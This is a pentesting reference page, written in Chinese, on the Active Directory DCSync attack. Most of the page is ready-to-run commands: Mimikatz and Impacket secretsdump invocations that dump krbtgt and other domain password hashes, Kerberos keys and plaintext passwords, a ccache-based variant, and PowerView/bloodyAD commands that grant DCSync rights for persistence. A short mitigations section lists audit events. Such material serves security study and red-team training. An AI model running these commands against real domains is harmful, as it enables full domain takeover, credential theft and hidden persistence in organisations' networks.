# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

**DCSync** 权限意味着对域本身拥有以下权限：**DS-Replication-Get-Changes**、**Replicating Directory Changes All** 和 **Replicating Directory Changes In Filtered Set**。<sup>[[3]](#references)</sup>

**关于 DCSync 的重要说明：**

- **DCSync attack 会模拟 Domain Controller 的行为，并使用 Directory Replication Service Remote Protocol (MS-DRSR) 请求其他 Domain Controller 复制信息**。由于 MS-DRSR 是 Active Directory 的有效且必要的功能，因此无法将其关闭或禁用。
- 默认情况下，只有 **Domain Admins、Enterprise Admins、Administrators 和 Domain Controllers** 组拥有所需的权限。
- 实际上，**full DCSync** 需要在域命名上下文中拥有 **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`**。通常会将 `DS-Replication-Get-Changes-In-Filtered-Set` 与它们一起委派，但单独使用时，它更适用于同步 **confidential / RODC-filtered attributes**（例如旧版 LAPS 风格的 secrets），而不是完整的 krbtgt dump。<sup>[[2]](#references)</sup>
- 如果任何账户密码使用可逆加密存储，Mimikatz 中提供了一个选项，可以返回明文密码

### 枚举

使用 `powerview` 检查谁拥有这些权限：
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
如果你想重点关注拥有 **DCSync** 权限的**非默认主体**，请过滤掉内置的、具备复制能力的组，仅审查异常的受托者：
```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
Where-Object {
$_.ObjectType -match 'replication-get' -or
$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
} |
Where-Object { $_.IdentityReference -notmatch $default } |
Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```
### 本地利用
```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### 远程利用
```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```
实用的范围限定示例：<sup>[[1]](#references)</sup>
```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```
### 使用捕获的 DC 计算机 TGT（ccache）执行 DCSync

在 unconstrained-delegation export-mode 场景中，你可能会捕获 Domain Controller 计算机 TGT（例如，用于 `krbtgt@DOMAIN` 的 `DC1$@DOMAIN`）。然后，你可以使用该 ccache 以 DC 身份进行身份验证，并在无需密码的情况下执行 DCSync。<sup>[[5]](#references)</sup>
```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
操作说明：

- **Impacket 的 Kerberos 路径会先访问 SMB**，然后才调用 DRSUAPI。如果环境强制执行 **SPN 目标名称验证**，完整 dump 可能会失败，并显示 `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`。
- 在这种情况下，可以先为目标 DC 请求 **`cifs/<dc>`** 服务票据，或者对立即需要的账户改用 **`-just-dc-user`**。
- 当你只有较低级别的复制权限时，LDAP/DirSync-style syncing 仍可能暴露 **confidential** 或 **RODC-filtered** 属性（例如旧版 `ms-Mcs-AdmPwd`），而无需完整复制 krbtgt。<sup>[[2]](#references)</sup>

`-just-dc` 会生成 3 个文件：

- 一个包含 **NTLM hashes**
- 一个包含 **Kerberos keys**
- 一个包含 NTDS 中为启用了[**可逆加密**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption)的账户保存的明文密码。你可以使用以下命令获取启用了可逆加密的用户：

```bash
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### 持久化

如果你是 domain admin，可以借助 PowerView 向任意用户授予这些权限：<sup>[[3]](#references)</sup>
```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Linux 操作者也可以使用 `bloodyAD` 执行相同操作：
```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```
然后，你可以在以下命令的输出中查找这 3 个权限，以检查它们是否已正确分配给该用户（你应该能在“ObjectType”字段中看到这些权限的名称）：
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### 缓解措施

- Security Event ID 4662（必须启用对象的 Audit Policy）– 对对象执行了操作<sup>[[4]](#references)</sup>
- Security Event ID 5136（必须启用对象的 Audit Policy）– 修改了目录服务对象
- Security Event ID 4670（必须启用对象的 Audit Policy）– 更改了对象的权限
- AD ACL Scanner - 创建并比较 ACL 报告。[https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [1] [Impacket 更新日志](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [2] [DirSync：利用 Replication Get-Changes 和 Get-Changes-In-Filtered-Set](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [3] [DCSync：从 Domain Controller 转储密码哈希](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [4] [DCSync](https://yojimbosecurity.ninja/dcsync/)
- [5] [HTB：Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
{{#include ../../banners/hacktricks-training.md}}
